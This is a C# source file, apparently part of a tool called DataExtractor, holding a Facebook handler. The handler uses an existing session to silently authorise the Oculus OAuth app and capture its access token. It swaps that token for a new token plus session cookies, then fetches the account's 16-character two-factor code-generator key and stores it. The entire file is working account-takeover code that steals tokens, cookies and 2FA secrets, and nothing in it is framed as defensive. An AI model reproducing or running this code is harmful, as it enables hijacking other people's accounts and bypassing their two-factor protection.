using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Web;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;
using Newtonsoft.Json;

namespace DataExtractor.Core.Handlers.Fb;

public class GetNewTokanFbHandler
{
	public class FaCodeJsonModel
	{
		public string key { get; set; }

		public string time_offset { get; set; }
	}

	public class TokenJsonModel
	{
		public string session_key { get; set; }

		public long uid { get; set; }

		public string secret { get; set; }

		public string access_token { get; set; }

		public string machine_id { get; set; }

		public Session_Cookies[] session_cookies { get; set; }
	}

	public class Session_Cookies
	{
		public string name { get; set; }

		public string value { get; set; }

		public string expires { get; set; }

		public int expires_timestamp { get; set; }

		public string domain { get; set; }

		public string path { get; set; }

		public bool secure { get; set; }

		public string samesite { get; set; }

		public bool httponly { get; set; }
	}

	public string Get(HttpClient httpClient, FbData fbData)
	{
		string tokenOculus = GetTokenOculus(httpClient, fbData);
		if (string.IsNullOrEmpty(tokenOculus))
		{
			return "";
		}
		string text = ExchangeToken(httpClient, fbData, tokenOculus);
		if (string.IsNullOrEmpty(text))
		{
			return "";
		}
		GetCode(httpClient, fbData, text);
		return text;
	}

	private void GetCode(HttpClient httpClient, FbData fbData, string token)
	{
		fbData.Log("Begin get code 16 char");
		string formData = "format=json&locale=vi_VN&client_country_code=VN&fb_api_req_friendly_name=graphUserLoginApprovalsKeysPost&fb_api_caller_class=CodeGeneratorOperationHandler&access_token=" + token;
		string text = httpClient.PostString("https://graph.facebook.com/" + fbData.UserId + "/loginapprovalskeys", formData, "application/x-www-form-urlencoded");
		if (string.IsNullOrEmpty(text))
		{
			fbData.Log("No html");
		}
		else
		{
			fbData.Log("result \n " + text);
		}
		try
		{
			FaCodeJsonModel faCodeJsonModel = JsonConvert.DeserializeObject<FaCodeJsonModel>(text);
			if (faCodeJsonModel != null && !string.IsNullOrEmpty(faCodeJsonModel.key))
			{
				fbData.Code16 = faCodeJsonModel.key;
				fbData.Codes.Push(faCodeJsonModel.key);
			}
		}
		catch
		{
			fbData.Log("No key");
		}
	}

	private string ExchangeToken(HttpClient httpClient, FbData fbData, string tokenOculus)
	{
		fbData.Log("Exchange token");
		string text = "350685531728";
		string formData = "{\"format\":\"json\",\"new_app_id\":\"" + text + "\",\"access_token\":\"" + tokenOculus + "\",\"generate_session_cookies\":1}";
		string text2 = httpClient.PostString("https://graph.facebook.com/auth/create_session_for_app", formData, "application/json", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		if (string.IsNullOrEmpty(text2))
		{
			fbData.Log("html = null");
			return null;
		}
		fbData.Log("Data " + text2);
		TokenJsonModel tokenJsonModel = JsonConvert.DeserializeObject<TokenJsonModel>(text2);
		if (tokenJsonModel != null && !string.IsNullOrEmpty(tokenJsonModel.access_token))
		{
			if (tokenJsonModel.session_cookies != null)
			{
				fbData.NewCookies = string.Join(";", tokenJsonModel.session_cookies.Select((Session_Cookies a) => a.name + "=" + a.value));
				fbData.Log("new cookie : " + fbData.NewCookies);
			}
			return tokenJsonModel.access_token;
		}
		return null;
	}

	private string GetTokenOculus(HttpClient httpClient, FbData fbData)
	{
		fbData.Log("get token ocl");
		string @string = httpClient.GetString("https://mbasic.facebook.com/dialog/oauth?client_id=1517832211847102&redirect_uri=https%3A%2F%2Fauth.oculus.com%2Flogin%2Flogin&response_type=token&scope=public_profile%2Cemail%2Cuser_birthday", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		if (string.IsNullOrEmpty(@string))
		{
			fbData.Log("No html");
			return null;
		}
		string str = @string.RegGetString("name=\"fb_dtsg\".value=\"(.+?)\"");
		string str2 = @string.RegGetString("name=\"scope\".value=\"(.+?)\"");
		string str3 = @string.RegGetString("name=\"encrypted_post_body\".value=\"(.+?)\"");
		string formData = "fb_dtsg=" + HttpUtility.UrlEncode(str) + "&jazoest=25584&scope=" + HttpUtility.UrlEncode(str2) + "&display=touch&sdk=&sdk_version=&domain=&sso_device=&state=&user_code=&nonce=&logger_id=a98b5671-d266-4605-a8aa-53a0e1c77ede&auth_type=&auth_nonce=&code_challenge=&code_challenge_method=&encrypted_post_body=" + HttpUtility.UrlEncode(str3) + "&return_format%5B%5D=access_token";
		HttpResponseMessage httpResponseMessage = httpClient.Post("https://mbasic.facebook.com/dialog/oauth/skip/submit/", formData, "application/x-www-form-urlencoded", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "empty" },
			{ "Sec-Fetch-Mode", "cors" },
			{ "Sec-Fetch-Site", "same-origin" }
		});
		if (httpResponseMessage == null)
		{
			fbData.Log("get that bai");
			return null;
		}
		return httpResponseMessage.RequestMessage.RequestUri.ToString().RegGetString("access_token=(.+?)&");
	}
}
